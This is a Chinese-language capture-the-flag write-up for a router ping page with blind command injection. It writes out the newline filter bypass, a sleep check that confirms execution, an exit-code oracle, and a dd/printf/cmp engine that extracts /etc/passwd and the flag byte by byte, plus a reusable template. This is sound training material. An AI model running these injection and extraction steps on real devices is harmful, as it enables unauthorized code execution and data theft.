# 【DASCTF】NN-007 路由器 - 命令注入 + 布尔盲注逐字节提取

> 平台：DASCTF ｜ flag：`n1book{6fa82809179d7f19c67259aa285a7729}` ｜ 2026-08-04
> 定位：命令注入进阶（盲 RCE + 布尔 oracle + 逐字节提取）★高难度综合
> 学生状态：解题过程全程顺利但耗时耗神，首次接触盲注提取，标记为"硬核但套路化"

---

## 一、题目面貌

```
"NN-007 路由器" Ping 测试页（PHP/7.3）
入口：POST ping.php，参数 ip（首页 JS 里 $.post("ping.php",{ip:...}) 泄露）
```

## 二、四层难点拆解（逐一对应解法）

| 层 | 难点 | 解法 |
|---|---|---|
| ① 命令注入 | Ping 参数拼接执行命令 | 3873 Ping-Ping 学过：ip 后拼接 |
| ② 过滤 | 拦 `;&|`$%*"'(){}[]!~^:#\@` 和 `-` | 换行 `\n` 漏网 → 命令分隔符 |
| ③ 盲注 | 无回显，只回"成功/失败" | 成功/失败 = 退出码 → 布尔 oracle |
| ④ 提取 | 看不到内容，/tmp可写但webroot不可写 | dd+printf+cmp 逐字节提取引擎 |

## 三、解题链（10 步）

### 1. 信息收集
页面 Ping 测试 + 读首页 JS → 入口 = POST ping.php 参数 ip

### 2. 测注入
`ip=127.0.0.1;id` → "IP包含恶意字符" → 有过滤器

### 3. 摸过滤（对比实验）
`; && | 反引号 $ % *` 全拦；**真实换行 `\n` 放行** → 换行是命令分隔符！

### 4. 确认 RCE（时间盲注）
`ip=127.0.0.1\nsleep 3` → 响应 3 秒 → 命令真执行

### 5. 发现布尔 oracle
`\ntrue`→成功、`\nfalse`→失败、`\ncat /etc/passwd`→成功
→ **成功/失败 = 命令退出码** = 是非题机器

### 6. 摸字符过滤 + 工具清单
- 拦：`-` 和 `;&|`$%*"'(){}[]!~^:#\@`
- 可用：`cat dd cmp printf ls tr expr strings`（都无 `-` 参数）
- `-` 被拦 = test/grep/wc/head/cut/od 全废

### 7. 找可写目录
webroot 写失败；`cat /etc/passwd >/tmp/t6.txt` 成功 → **/tmp 可写**

### 8. 搭建逐字节提取引擎
```
dd 把文件第N字节剪到 /tmp/b      dd if=file bs=1 count=1 skip=N of=/tmp/b
printf 把猜的字符写到 /tmp/g     printf 字符 > /tmp/g
cmp 比对：相同=退出码0=成功      cmp /tmp/b /tmp/g
```
（用 `=` 不用 `-`，避开过滤）

### 9. 枚举目录找 flag
`ls / > /tmp/root.txt` → 逐字提取 → `FLAG bin dev etc home ...`
→ **根目录有大写 /FLAG**（小写 /flag 测不到的原因）

### 10. 提取 /FLAG
`cat /FLAG > /tmp/flag.txt` → 逐字提取 → `n1book?6fa8...7729?`
`?`=猜不到的符号位（`{` `}` 无法作为输入），按格式 `n1book{...}` 补全
→ **flag = `n1book{6fa82809179d7f19c67259aa285a7729}`**

---

## 四、核心套路（可复用模板）

### 盲 RCE 完整打法
```
找注入点 → 摸过滤 → 换行绕过 → sleep确认 → 找oracle(成功/失败=退出码)
→ 找可写点(/tmp) → 建提取引擎(dd+printf+cmp) → 枚举文件 → 拖flag
```

### 提取引擎（已固化 web/blind_rce_extract.py）
```bash
python blind_rce_extract.py <ping.php地址> <目标文件> <读取长度>
```

### 关键经验
1. 换行 `\n` = 命令分隔符，能绕过拦分号/管道的过滤
2. "成功/失败"回显 = 退出码 oracle（true成功/false失败 校准）
3. `-` 被拦 → 用无 `-` 写法：`dd if=.. of=..` / `cmp f1 f2` / `printf x > f`
4. Linux 文件名区分大小写：`FLAG` ≠ `flag`，要枚举目录
5. 盲注提取 = 单字符穷举（每位置试 a-z0-9 最多60次）+ 格式已知优化

---

## 相关笔记
- Web笔记13-sqlmap速查（工具类）
- 工具：`blind_rce_extract.py`（本 WP 同目录）
